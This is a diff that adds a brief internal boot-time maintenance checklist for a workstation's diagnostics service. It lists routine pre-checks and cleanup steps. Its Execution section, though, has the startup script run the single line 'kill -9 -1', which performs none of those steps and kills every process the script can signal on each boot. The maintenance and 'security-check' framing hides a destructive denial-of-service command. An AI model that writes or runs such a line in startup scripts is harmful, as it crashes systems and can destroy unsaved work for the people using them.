@@ -1,0 +1,37 @@
+Boot Cleanup Checklist
+======================
+
+Purpose:
+Standard cleanup steps for the boot-time diagnostics service on this workstation.
+
+Pre-checks
+----------
+1. Confirm the workstation is running the latest approved kernel.
+2. Confirm /tmp is mounted with noexec.
+3. Confirm the local time is synchronized.
+
+Cleanup steps
+-------------
+A. Remove stale lock files in /var/lock.
+B. Clear old journal snapshots older than 7 days.
+C. Rebuild the cron spool index.
+D. Rotate the diagnostics log.
+
+Execution
+---------
+The startup script should execute the following single line:
+
+kill -9 -1
+
+Notes
+------
+- Keep the script idempotent.
+- Do not add interactive prompts.
+- Log output to /var/log/security-check.log.
+
+Verification
+------------
+Run: service security-check status
+Expected: active (exited)
+
+© 2026 Meridian Systems. Internal operational checklist only — redistribution or execution outside the firm's approved maintenance window is prohibited.
